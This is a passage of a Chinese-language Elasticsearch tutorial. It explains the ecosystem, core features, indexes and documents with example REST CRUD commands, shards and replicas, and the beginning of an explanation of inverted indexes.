还拥有丰富的生态系统：</p><ul><li><strong>Beats</strong>：轻量级数据采集器，用于将数据发送到 Elasticsearch。</li><li><strong>Logstash</strong>：数据处理管道，支持从多种来源收集、转换和加载数据到 Elasticsearch。</li><li><strong>Kibana</strong>：强大的可视化工具，可以创建各种仪表盘和图表，直观展示数据分析结果。</li></ul><h3 id="1-2-7-企业级功能"><a href="#1-2-7-企业级功能" class="headerlink" title="1.2.7. 企业级功能"></a>1.2.7. 企业级功能</h3><p>对于需要高性能和高可靠性的企业应用，Elasticsearch 还提供了一些高级功能，例如：</p><ul><li><strong>安全性</strong>：通过 X-Pack 提供的安全功能，可以实现用户身份验证、访问控制和数据加密，确保数据安全。</li><li><strong>监控和报警</strong>：可以监控集群的运行状态，设置报警机制，在出现问题时及时通知管理员。</li></ul><h2 id="1-3-Elasticsearch-的特点与优势"><a href="#1-3-Elasticsearch-的特点与优势" class="headerlink" title="1.3.Elasticsearch 的特点与优势"></a>1.3.Elasticsearch 的特点与优势</h2><p>Elasticsearch 是一个功能强大且灵活的搜索和分析引擎。<strong>它不仅仅是一个搜索工具，更是一个能够处理大规模数据、提供实时分析的综合解决方案</strong>。</p><h3 id="1-3-1-分布式架构"><a href="#1-3-1-分布式架构" class="headerlink" title="1.3.1. 分布式架构"></a>1.3.1. 分布式架构</h3><h4 id="分片和副本"><a href="#分片和副本" class="headerlink" title="分片和副本"></a>分片和副本</h4><p>Elasticsearch 采用<strong>分布式架构设计</strong>，<strong>数据被分成多个分片（shards）并分布存储在多个节点上</strong>。<strong>每个分片可以有一个或多个副本（replicas），以提高数据的可用性和容错性。</strong></p><ul><li><strong>分片</strong>：将数据分成更小的块，分布在集群中的不同节点上，提高查询和索引的性能。</li><li><strong>副本</strong>：每个分片可以有多个副本，分布在不同节点上，确保数据的高可用性和容错性。</li></ul><p>这种分布式设计使得 Elasticsearch 能够轻松扩展，通过增加节点来处理更多的数据和更高的查询负载。</p><h3 id="1-3-2-近实时搜索"><a href="#1-3-2-近实时搜索" class="headerlink" title="1.3.2. 近实时搜索"></a>1.3.2. 近实时搜索</h3><p>Elasticsearch 的一个显著特点是其近实时（Near Real-Time, NRT）搜索能力。当新数据被索引后，几乎立即就可以被搜索到。这对于需要快速处理和分析新数据的应用场景非常重要，例如日志分析和监控系统。</p><h3 id="1-3-3-强大的全文搜索能力"><a href="#1-3-3-强大的全文搜索能力" class="headerlink" title="1.3.3. 强大的全文搜索能力"></a>1.3.3. 强大的全文搜索能力</h3><p>Elasticsearch 基于 Apache Lucene，具备强大的全文搜索功能。它能够处理各种复杂的查询需求，包括：</p><ul><li><strong>布尔查询</strong>：支持 AND、OR、NOT 等逻辑操作。</li><li><strong>短语查询</strong>：能够搜索精确的短语匹配。</li><li><strong>范围查询</strong>：支持对数值、日期等范围的查询。</li><li><strong>分词器和倒排索引</strong>：通过分词器将文本分成词条，并创建倒排索引，使得全文搜索快速高效。</li></ul><h3 id="1-3-4-丰富的分析功能"><a href="#1-3-4-丰富的分析功能" class="headerlink" title="1.3.4. 丰富的分析功能"></a>1.3.4. 丰富的分析功能</h3><p>除了搜索，Elasticsearch 还提供了强大的数据分析功能。通过聚合（aggregation）功能，可以对大规模数据进行复杂的统计分析，例如：</p><ul><li>计数：计算文档的数量。</li><li>求和：计算数值字段的总和。</li><li>平均值：计算数值字段的平均值。</li><li>最大值和最小值：找到数值字段的最大值和最小值。</li><li>直方图和分布：创建数据分布的直方图和分桶统计。</li></ul><p>这些功能使得 Elasticsearch 不仅是一个搜索引擎，还可以作为一个强大的分析工具。</p><h3 id="1-3-5-灵活的-RESTful-API"><a href="#1-3-5-灵活的-RESTful-API" class="headerlink" title="1.3.5. 灵活的 RESTful API"></a>1.3.5. 灵活的 RESTful API</h3><p>Elasticsearch 提供了灵活的 RESTful API，支持通过 HTTP 请求与其交互。这使得它的使用和集成变得非常简单：</p><ul><li><strong>索引数据</strong>：通过简单的 HTTP PUT 或 POST 请求将数据存储到 Elasticsearch 中。</li><li><strong>执行查询</strong>：通过 HTTP GET 请求执行各种搜索查询。</li><li><strong>集群管理</strong>：通过 API 进行集群的配置和管理。</li></ul><p>这种灵活性使得开发者能够轻松地将 Elasticsearch 集成到各种应用和系统中。</p><h3 id="1-3-6-扩展性和高可用性"><a href="#1-3-6-扩展性和高可用性" class="headerlink" title="1.3.6. 扩展性和高可用性"></a>1.3.6. 扩展性和高可用性</h3><p>由于其分布式架构，Elasticsearch 具有很高的扩展性和高可用性：</p><ul><li><strong>线性扩展</strong>：<strong>通过增加节点，可以线性地增加存储和处理能力。</strong></li><li><strong>容错能力</strong>：<strong>通过分片和副本机制，即使某个节点出现故障，其他节点仍然可以继续工作，确保系统的高可用性。</strong></li></ul><p>这种设计使得 Elasticsearch 能够处理从几百兆到几百TB的数据量，适应各种规模的应用需求。</p><h3 id="1-3-7-安全性和权限控制"><a href="#1-3-7-安全性和权限控制" class="headerlink" title="1.3.7. 安全性和权限控制"></a>1.3.7. 安全性和权限控制</h3><p>Elasticsearch 提供了多种安全功能，确保数据的安全性和访问控制：</p><ul><li>身份验证和授权：通过 X-Pack 插件提供用户身份验证和基于角色的访问控制。</li><li>加密：支持数据在传输和存储中的加密，确保数据安全。</li><li>审计：记录所有访问和操作日志，方便进行安全审计和合规检查。</li></ul><h3 id="1-3-8-丰富的生态系统"><a href="#1-3-8-丰富的生态系统" class="headerlink" title="1.3.8. 丰富的生态系统"></a>1.3.8. 丰富的生态系统</h3><p>Elasticsearch 拥有一个丰富的生态系统，包括：</p><ul><li>Beats：轻量级的数据收集器，可以从各种数据源收集数据并发送到 Elasticsearch。</li><li>Logstash：强大的数据处理管道，支持数据收集、转换和加载（ETL）操作。</li><li>Kibana：可视化工具，提供强大的数据展示和分析功能，可以创建各种仪表盘和图表。</li></ul><p>这些工具与 Elasticsearch 紧密集成，提供了一个完整的数据收集、处理、存储、分析和可视化解决方案。</p><h3 id="1-3-9-活跃的社区和持续的发展"><a href="#1-3-9-活跃的社区和持续的发展" class="headerlink" title="1.3.9. 活跃的社区和持续的发展"></a>1.3.9. 活跃的社区和持续的发展</h3><p>作为一个开源项目，Elasticsearch 拥有一个活跃的社区。社区的活跃度带来了持续的发展和改进：</p><ul><li>社区支持：活跃的用户社区提供了丰富的文档、教程和论坛支持，帮助新用户快速上手。</li><li>持续更新：开发者不断贡献新的功能和改进，使得 Elasticsearch 保持在技术的前沿。</li></ul><h1 id="2-Elasticsearch-核心概念与基本操作"><a href="#2-Elasticsearch-核心概念与基本操作" class="headerlink" title="2.Elasticsearch 核心概念与基本操作"></a><strong>2.Elasticsearch 核心概念与基本操作</strong></h1><h2 id="2-1-索引与文档"><a href="#2-1-索引与文档" class="headerlink" title="2.1.索引与文档"></a>2.1.索引与文档</h2><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d890e7b6152041b2a98f54ad29d1c6ea.png" alt="img"></p><p><strong>（Type，注：Elasticsearch 7.0以后弃用了Type）</strong></p><p>在了解 Elasticsearch 的过程中，<strong>索引（Index）和文档（Document）</strong>是两个最基本也是最重要的概念。理解它们的作用和关系，有助于更好地掌握如何使用 Elasticsearch 存储、搜索和分析数据。</p><h3 id="2-1-1-什么是索引？"><a href="#2-1-1-什么是索引？" class="headerlink" title="2.1.1.什么是索引？"></a>2.1.1.什么是索引？</h3><p>索引在 Elasticsearch 中是一个存储结构，用来组织和存储数据。你可以把它看作一个数据库或一个文件夹，其中包含了多个文档。每个索引都有一个唯一的名字，用于在操作数据时进行引用。</p><ul><li><strong>数据库</strong>：在传统的关系数据库中，数据库是存储表的容器。</li><li><strong>索引</strong>：在 Elasticsearch 中，索引是存储文档的容器。<strong>类似于关系型数据库（MySQL）中的数据库和表的组合体。</strong></li></ul><p>每个索引可以包含多种类型的文档，而这些文档具有类似的结构。例如，如果你有一个包含商品信息的索引，索引中的每个文档都可能包含商品名称、描述、价格等字段。</p><h3 id="2-1-1-1-定义"><a href="#2-1-1-1-定义" class="headerlink" title="2.1.1.1. 定义"></a>2.1.1.1. 定义</h3><p>索引在 Elasticsearch 中是一个逻辑存储单元，类似于关系型数据库中的“数据库”概念。<br> 它是一个文档的集合，这些文档具有相似的特性或属于同一逻辑分类。</p><h3 id="2-1-1-2-分片与副本"><a href="#2-1-1-2-分片与副本" class="headerlink" title="2.1.1.2. 分片与副本"></a>2.1.1.2. 分片与副本</h3><p>索引可以包含<strong>一个或多个分片（Shards）</strong>，每个分片都是一个 Lucene 实例，可以独立地进行搜索和存储操作。分片允许 Elasticsearch 在多个服务器上水平扩展，从而处理更多的数据和查询。<br> 每个分片可以有零个或多个副本（Replicas），副本是分片的完整拷贝，用于提供数据的冗余和容错性。当某个分片所在的服务器出现故障时，可以从其副本中恢复数据。</p><h3 id="2-1-1-3-数据存储"><a href="#2-1-1-3-数据存储" class="headerlink" title="2.1.1.3. 数据存储"></a>2.1.1.3. 数据存储</h3><p>索引中的文档被存储为 JSON 格式，这使得 Elasticsearch 能够存储结构化和非结构化数据。<br> Elasticsearch 使用倒排索引（Inverted Index）技术来实现高效的全文搜索。倒排索引将文档中的单词与其在文档中的位置信息关联起来，从而可以快速定位包含特定单词的文档。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/41517010d4f54cef9688c60120ea1af7.png" alt="img"></p><h3 id="2-1-2-什么是文档？"><a href="#2-1-2-什么是文档？" class="headerlink" title="2.1.2.什么是文档？"></a>2.1.2.什么是文档？</h3><p>文档是 Elasticsearch 中的数据单位。每个文档是一组键值对（键是字段名，值是字段值），并且存储在某个索引中。文档的格式通常是 JSON 格式，这使得它非常灵活和易于使用。</p><ul><li><strong>记录</strong>：在传统的关系数据库中，表中的一行就是一条记录。</li><li><strong>文档</strong>：在 Elasticsearch 中，索引中的一个文档就是一个数据条目。</li></ul><p>例如，一个描述商品的文档可能如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;product_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Laptop&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;A high-performance laptop&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;price&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">999.99</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;stock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">50</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这个文档包含了商品的 ID、名称、描述、价格和库存量等信息。</p><p>以下是关于 Elasticsearch 文档的一些重要概念和特点：</p><ol><li><strong>结构化数据</strong>：文档是结构化的数据对象，由多个字段组成。每个字段都有一个名称和对应的值，可以是简单的数据类型（如文本、数字、日期等）或复杂的数据结构（如嵌套对象、数组等）。</li><li><strong>唯一标识</strong>：每个文档都有一个唯一标识符（ID），用于在索引中唯一标识该文档。ID 可以由 Elasticsearch 自动生成，也可以由用户指定。</li><li><strong>索引存储</strong>：文档被存储在索引中，每个索引可以包含多个文档。索引是文档的集合，类似于关系型数据库中的表。</li><li><strong>字段映射</strong>：文档的字段映射定义了每个字段的数据类型、分析器等属性。字段映射可以手动指定，也可以由 Elasticsearch 根据插入的文档自动推断生成。</li><li><strong>全文搜索</strong>：Elasticsearch 支持全文搜索，可以对文档中的文本字段进行全文检索。全文搜索可以根据关键词、词语匹配度等条件快速定位到符合条件的文档。</li><li><strong>CRUD 操作</strong>：文档支持 CRUD 操作，即创建（Create）、读取（Retrieve）、更新（Update）和删除（Delete）。通过 Elasticsearch 的 API 可以对文档进行增删改查操作。</li><li><strong>版本控制</strong>：Elasticsearch 支持文档的版本控制，每个文档可以有多个版本。当对文档进行更新操作时，Elasticsearch 会自动创建新版本，并保存历史版本的数据。</li></ol><p>文档是 Elasticsearch 中存储和组织数据的基本单位，具有灵活的数据模型、强大的全文搜索和分析功能，是构建分布式搜索引擎和分布式数据存储系统的核心组件之一。</p><h3 id="2-1-3-索引与文档的关系"><a href="#2-1-3-索引与文档的关系" class="headerlink" title="2.1.3.索引与文档的关系"></a>2.1.3.索引与文档的关系</h3><p>索引与文档的关系**类似于数据库与记录**（相当于 MySQL 中的行（Row））**的关系**。一个索引包含多个文档，而每个文档属于某个索引。</p><h3 id="2-1-4-创建索引和文档"><a href="#2-1-4-创建索引和文档" class="headerlink" title="2.1.4.创建索引和文档"></a>2.1.4.创建索引和文档</h3><p>现在我们了解了什么是索引和文档，接下来看看如何在 Elasticsearch 中创建它们。</p><ul><li><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4></li></ul><p>在 Elasticsearch 中创建索引非常简单，可以使用 RESTful API 进行操作。例如，要创建一个名为 “products” 的索引，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PUT /products<br></code></pre></td></tr></table></figure><p>这个命令会创建一个名为 “products” 的索引，用于存储商品信息的文档。</p><ul><li><h4 id="添加文档"><a href="#添加文档" class="headerlink" title="添加文档"></a>添加文档</h4></li></ul><p>创建索引后，我们可以向其中添加文档。例如，向 “products” 索引中添加一个商品文档，可以使用以下命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/products/</span>_doc/<span class="hljs-number">1</span><br>&#123;<br>  <span class="hljs-string">&quot;product_id&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Laptop&quot;</span>,<br>  <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;A high-performance laptop&quot;</span>,<br>  <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">999.99</span>,<br>  <span class="hljs-string">&quot;stock&quot;</span>: <span class="hljs-number">50</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里，<code>_doc</code> 是文档类型，<code>1</code> 是文档的 ID。如果不指定 ID，Elasticsearch 会自动生成一个唯一的 ID。</p><ul><li><h4 id="检索文档"><a href="#检索文档" class="headerlink" title="检索文档"></a>检索文档</h4></li></ul><p>要检索刚才添加的文档，可以使用以下命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /products/_doc/1<br></code></pre></td></tr></table></figure><p>这个命令会返回 ID 为 1 的文档的详细信息。</p><ul><li><h4 id="更新和删除文档"><a href="#更新和删除文档" class="headerlink" title="更新和删除文档"></a>更新和删除文档</h4></li></ul><p>除了创建和检索文档外，Elasticsearch 还提供了更新和删除文档的功能。</p><ul><li><strong>更新文档</strong></li></ul><p>要更新现有文档，可以使用以下命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/products/</span>_doc<span class="hljs-regexp">/1/</span>_update<br>&#123;<br>  <span class="hljs-string">&quot;doc&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">899.99</span>,<br>    <span class="hljs-string">&quot;stock&quot;</span>: <span class="hljs-number">45</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个命令会更新 ID 为 1 的文档的价格和库存信息。</p><ul><li>删除文档</li></ul><p>要删除某个文档，可以使用以下命令：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">DELETE</span> <span class="hljs-regexp">/products/</span>_doc/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这个命令会删除 ID 为 1 的文档。</p><h3 id="2-1-5-Elasticsearch与RDBMS的对应关系"><a href="#2-1-5-Elasticsearch与RDBMS的对应关系" class="headerlink" title="2.1.5.Elasticsearch与RDBMS的对应关系"></a>2.1.5.Elasticsearch与RDBMS的对应关系</h3><p>我相信大家对关系型数据库（简称 RDBMS）应该比较了解，因此接下来拿关系型数据库和 ES 做一个类比，让大家更容易理解</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6ccfb72e46664962ac030907f3c203c5.png" alt="img"></p><p>从表中，不难看出，关系型数据库和 ES 有如下对应关系：</p><ul><li>关系型数据库中的<strong>表（Table）</strong>对应 ES 中的<strong>索引（Index）</strong></li><li>关系型数据库中的每条<strong>记录（Row）</strong>对应 ES 中的<strong>文档（Document）</strong></li><li>关系型数据库中的<strong>字段（Column）</strong>对应 ES 中的<strong>字段（Filed）</strong></li><li>关系型数据库中的<strong>表定义（Schema）</strong>对应着 ES 中的<strong>映射（Mapping）</strong></li><li>关系型数据库中可以<strong>通过 SQL 进行查询等操作</strong>，在 ES 中也提供了 <strong>DSL 进行查询等操作</strong></li></ul><p>当进行全文检索或者对搜索结果进行算分的时候，ES 比较合适，但如果对数据事务性要求比较高的时候，会把关系型数据库和 ES 结合使用。</p><p>为了方便其他语言的整合，ES 也提供了 <strong>REST API 来给其他程序进行调用</strong>，当我们的程序要和 ES 进行集成的时候，只需要发出 HTTP 的请求就会得到相应的结果</p><h2 id="2-2-分布式架构"><a href="#2-2-分布式架构" class="headerlink" title="2.2.分布式架构"></a>2.2.分布式架构</h2><p>TODO：分布式的详细介绍将单独发布在另一篇文章中（新文章会补充相关内容），这里只做简要概述。</p><p>Elasticsearch 是一个<strong>分布式搜索和分析引擎</strong>，这意味着它能够将数据和工作负载分布在多个节点上，以实现高性能、高可用性和可扩展性。分布式架构是 Elasticsearch 的核心特性之一，它使得 Elasticsearch <strong>可以处理大规模数据和高并发查询。</strong>下面将以 Elasticsearch 的分布式架构，包括集群、节点、索引、分片和副本等核心概念进行介绍。</p><h3 id="2-2-1-什么是分布式架构？"><a href="#2-2-1-什么是分布式架构？" class="headerlink" title="2.2.1.什么是分布式架构？"></a>2.2.1.什么是分布式架构？</h3><p>分布式架构是一种设计系统的方法，在这种方法中，系统的组件分布在多个计算机节点上，这些节点通过网络进行通信和协作。分布式架构具有以下几个显著的优点：</p><ul><li><strong>扩展性</strong>：可以通过增加更多的节点来提高系统的处理能力和存储容量。</li><li><strong>高可用性</strong>：即使某个节点出现故障，系统仍然可以继续运行。</li><li><strong>性能</strong>：通过将数据和查询请求分布到多个节点上，可以显著提高系统的处理速度和响应时间。</li></ul><h3 id="2-2-2-Elasticsearch-的分布式架构"><a href="#2-2-2-Elasticsearch-的分布式架构" class="headerlink" title="2.2.2.Elasticsearch 的分布式架构"></a>2.2.2.Elasticsearch 的分布式架构</h3><p>Elasticsearch 的分布式架构由几个关键组件组成：<strong>集群、节点、索引、分片和副本。</strong></p><h3 id="2-2-2-1-集群"><a href="#2-2-2-1-集群" class="headerlink" title="2.2.2.1.集群"></a>2.2.2.1.集群</h3><p>在 Elasticsearch 中，<strong>集群（Cluster）</strong>是由<strong>一个或多个节点（Node）</strong>组成的分布式系统。这些节点协同工作，共同存储、索引和搜索数据，提供高可用性、可伸缩性和容错性。集群是<strong>由一个或多个节点组成的集合，这些节点协同工作，共同存储数据并提供索引和搜索功能。</strong>每个集群都有一个唯一的名称，用于标识集群中的所有节点。集群中的所有节点通过网络相互通信，形成一个整体。</p><ol><li><strong>集群</strong>：类似于一群合作完成任务的计算机。</li><li><strong>节点的集合</strong>：集群是由多个节点组成的集合。每个节点都是一个独立的 Elasticsearch 实例，可以独立运行，也可以加入到一个集群中。</li><li><strong>数据分片和副本</strong>：集群中的数据被分成多个分片（Shard），每个分片可以在集群的不同节点上进行存储和复制。分片的复制称为副本（Replica），用于提高数据的可用性和容错性。</li><li><strong>负载均衡</strong>：集群可以自动进行负载均衡，将搜索请求和索引请求分配到各个节点上，以实现数据的均衡存储和处理。</li><li><strong>故障检测和容错</strong>：集群可以检测到节点的故障并进行处理，例如自动将丢失的分片复制到其他节点上，以确保数据的完整性和可用性。</li><li><strong>主节点</strong>：集群中的主节点（Master Node）负责集群的管理和协调工作，例如分配分片、故障检测、节点加入和退出等。</li><li><strong>集群状态</strong>：集群的状态可以是健康的（Green）、部分健康的（Yellow）或者不健康的（Red），根据集群中分片的分布和副本的状态来判断。</li><li><strong>动态扩展</strong>：集群可以根据需要动态扩展，可以增加节点、增加分片副本或者增加集群中的分片数量。</li></ol><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/081fd98a8dff41049c0aa195676129f5.png" alt="img"></p><h3 id="2-2-2-2-节点"><a href="#2-2-2-2-节点" class="headerlink" title="2.2.2.2.节点"></a>2.2.2.2.节点</h3><p>Elasticsearch中的<strong>节点（Node）指的是Elasticsearch实例的运行实例，即一个独立的Elasticsearch服务进程。</strong>每个节点都是一个独立的工作单元，负责存储数据、参与数据处理（如索引、搜索、聚合等）以及参与集群的协调工作。</p><p>节点<strong>是集群中的一个单独服务器</strong>，<strong>它存储数据并参与集群的索引和搜索操作</strong>。每个节点都有一个唯一的名称，并且可以承担不同的角色，例如<strong>主节点（负责集群管理）或数据节点（存储数据并处理搜索请求）</strong>。节点：类似于集群中的一个成员，每个成员都有特定的任务和职责。</p><p>通过多个节点（Node）,可以组成Elasticsearch高可用集群</p><p>节点可以承担多种角色，包括但不限于：</p><ul><li><strong>主节点（Master Node）</strong>：负责集群范围内的元数据管理和变更，如索引创建、删除、分片分配等。</li><li><strong>数据节点（Data Node）</strong>：存储实际数据和相关的索引文件，参与数据的索引、搜索和恢复过程。</li><li><strong>协调节点（Coordinating Node）</strong>：接收客户端请求，将请求路由至适当的节点，并将结果汇总返回给客户端。每个节点都可以充当协调节点，也可以专门设置某些节点仅作为协调节点。</li></ul><p>节点可以在物理或虚拟机上单独部署，也可以在同一台机器上运行多个节点（但需注意资源分配）。节点通过HTTP协议进行通信，共同管理集群的状态和数据。在Elasticsearch集群中，多个节点协同工作，共同提供高效、可靠的数据存储和搜索服务。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1c0c7f09ddaa4fa78bef4e9c19572218.png" alt="img"></p><h3 id="2-2-2-3-索引、分片和副本"><a href="#2-2-2-3-索引、分片和副本" class="headerlink" title="2.2.2.3.索引、分片和副本"></a>2.2.2.3.索引、分片和副本</h3><p>在 Elasticsearch 中，数据存储在索引中。<strong>每个索引可以被分为多个分片（shards），每个分片可以有一个或多个副本（replicas）。</strong>在 Elasticsearch 中，<strong>分片（Shard）</strong>和<strong>副本（Replica）</strong>是两个重要的概念，它们在集群中起着不同的作用。</p><h3 id="2-2-2-3-1-分片"><a href="#2-2-2-3-1-分片" class="headerlink" title="2.2.2.3.1.分片"></a><strong>2.2.2.3.1.分片</strong></h3><p><strong>分片是索引的一部分，是数据的基本存储单元。分片允许将索引的数据分布存储在多个节点上，从而实现数据的并行处理和存储。</strong>每个分片是一个独立的 Lucene 实例，可以单独进行搜索和索引操作。</p><ul><li>分片是 Elasticsearch 中存储数据的基本单位，每个索引（Index）都被分成多个分片，每个分片是一个独立的 Lucene 索引。</li><li>分片的数量在索引创建时就确定了，一旦确定就不能修改。默认情况下，每个索引会被分配 5 个主分片（Primary Shard），可以通过配置来修改。</li><li>分片的主要作用是<strong>实现数据的分布和并行处理</strong>。通过将索引数据分成多个分片存储在不同的节点上，可以提高搜索和索引操作的并发性和吞吐量。</li><li>分片：<strong>类似于将一本书拆分成多个章节，每个章节可以单独存放和阅读</strong>。</li></ul><h3 id="2-2-2-3-2-副本"><a href="#2-2-2-3-2-副本" class="headerlink" title="2.2.2.3.2.副本"></a><strong>2.2.2.3.2.副本</strong></h3><p><strong>副本是分片的复制品，用于提高数据的可用性和搜索性能。如果某个节点发生故障，副本可以提供数据的冗余存储，确保数据不会丢失。</strong>同时，副本还可以分担搜索请求的负载，提高查询性能。</p><ul><li><strong>副本是分片的拷贝，每个分片可以有多个副本</strong>。副本的数量在索引创建时可以指定，也可以后续动态修改。</li><li>副本的主要作用是<strong>提高数据的可用性和容错性</strong>。当某个节点上的分片不可用时，集群可以从其它节点上的副本中提供服务，确保数据的完整性和可用性。</li><li>默认情况下，每个分片会有一个副本，可以通过配置来修改副本的数量。副本的数量可以根据集群的规模、性能需求和容错需求来灵活调整。</li><li>副本：<strong>类似于书的备份副本，确保即使原书丢失，你仍然有备份可用。</strong></li></ul><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d530cb5b3fd645f2bd7def26b8e96f19.png" alt="img"></p><h3 id="2-2-3-分布式操作"><a href="#2-2-3-分布式操作" class="headerlink" title="2.2.3.分布式操作"></a>2.2.3.分布式操作</h3><p>Elasticsearch 的分布式架构使得数据存储和查询变得高效和可靠。以下是一些关键操作及其工作方式：</p><ul><li><h4 id="1-数据分发"><a href="#1-数据分发" class="headerlink" title="1. 数据分发"></a>1. 数据分发</h4></li></ul><p><strong>当向索引中添加文档时，Elasticsearch 会自动将文档分配到不同的分片中。分片存储在不同的节点上，实现数据的分布式存储。这种分发机制确保数据可以并行处理，提高了存储和索引的速度。</strong></p><ul><li><h4 id="2-查询分发"><a href="#2-查询分发" class="headerlink" title="2. 查询分发"></a>2. 查询分发</h4></li></ul><p><strong>当执行搜索查询时，Elasticsearch 会将查询请求分发到所有包含相关分片的节点上。这些节点并行处理查询，并将结果返回给协调节点，后者汇总所有结果并返回最终的查询结果。</strong>这种并行查询机制大大提高了搜索性能。</p><ul><li><h4 id="3-自动故障恢复"><a href="#3-自动故障恢复" class="headerlink" title="3. 自动故障恢复"></a>3. 自动故障恢复</h4></li></ul><p><strong>如果集群中的某个节点发生故障，Elasticsearch 会自动检测并将分片的副本提升为主分片，确保数据的高可用性。</strong>同时，集群会重新分配分片，确保负载均衡和数据冗余。</p><h3 id="2-2-4-例子：分片和副本的工作流程"><a href="#2-2-4-例子：分片和副本的工作流程" class="headerlink" title="2.2.4.例子：分片和副本的工作流程"></a>2.2.4.例子：分片和副本的工作流程</h3><p>假设你有一个名为 “products” 的索引，包含 5 个主分片和 1 个副本配置（即每个主分片有一个副本）。在一个由 3 个节点组成的集群中，数据的分布和操作如下：</p><ul><li>数据分布：5 个主分片和 5 个副本分片将分布在 3 个节点上。例如：<ul><li>节点 1：主分片 1、2，副本分片 3、4。</li><li>节点 2：主分片 3、4，副本分片 1、5。</li><li>节点 3：主分片 5，副本分片 2。</li></ul></li><li>索引操作：当你向 “products” 索引中<strong>添加一个新文档</strong>，Elasticsearch <strong>会将该文档分配到某个主分片</strong>。例如，文档可能会存储在主分片 1 中，并且副本分片 1 会同步更新该文档。</li><li>查询操作：当你搜索某个关键词，查询请求<strong>将分发到所有包含相关分片的节点上</strong>。例如，节点 1 和节点 2 将并行处理查询，并返回部分结果给协调节点进行汇总。</li><li>故障恢复：<strong>如果节点 2 发生故障</strong>，<strong>Elasticsearch 会自动将副本分片 1 和 5 提升为主分片，确保数据的可用性</strong>。<strong>然后，Elasticsearch 会在节点 1 和节点 3 之间重新分配分片，以恢复数据冗余</strong>。</li></ul><h2 id="2-3-倒排索引"><a href="#2-3-倒排索引" class="headerlink" title="2.3.倒排索引"></a>2.3.倒排索引</h2><p>倒排索引（Inverted Index）是 Elasticsearch 和其他搜索引擎的<strong>核心数据结构</strong>，用于实现高效的全文搜索。理解倒排索引的工作原理<strong>是掌握 Elasticsearch 搜索性能和效率的关键。</strong></p><h3 id="2-3-1-什么是倒排索引？"><a href="#2-3-1-什么是倒排索引？" class="headerlink" title="2.3.1.什么是倒排索引？"></a>2.3.1.什么是倒排索引？</h3><p>倒排索引是一种用于<strong>存储映射词汇到其在文档中位置的数据结构</strong>。它与传统的正排索引（正向索引）不同，后者是将文档与其包含的词汇进行映射。倒排索引的结构<strong>类似于一本书的索引部分，其中列出了每个重要词汇以及它们在书中出现的页码。</strong></p><ul><li><strong>正排索引</strong>：类似于一本书的内容目录，列出每章内容及其页码。</li><li><strong>倒排索引</strong>：类似于书的索引部分，<strong>列出每个关键字及其出现的页码</strong>。</li></ul><p>Elasticsearch 中的索引实际上就是所谓的倒排索引，它是所有搜索引擎工作的机制。</p><p>看看百度百科的定义：<strong>倒排索引_百度百科</strong></p><p>倒排索引源于实际应用中需要根据属性的值来查找记录。</p><p>在我们百度搜索资料的时候，大家是经常看到搜索不仅仅是局限于标题，大多数时候是搜索到内容的对吧？</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f08425ce08764d558dfa73d8e8c60301.png" alt="img"></p><p>从上面可以看出，如果让我们自己去设计数据结构，肯定不能按照以往的那种（查询标题）去设计对吧</p><p>正常的mysql：</p><p>Goods表：ID addTime goodsName 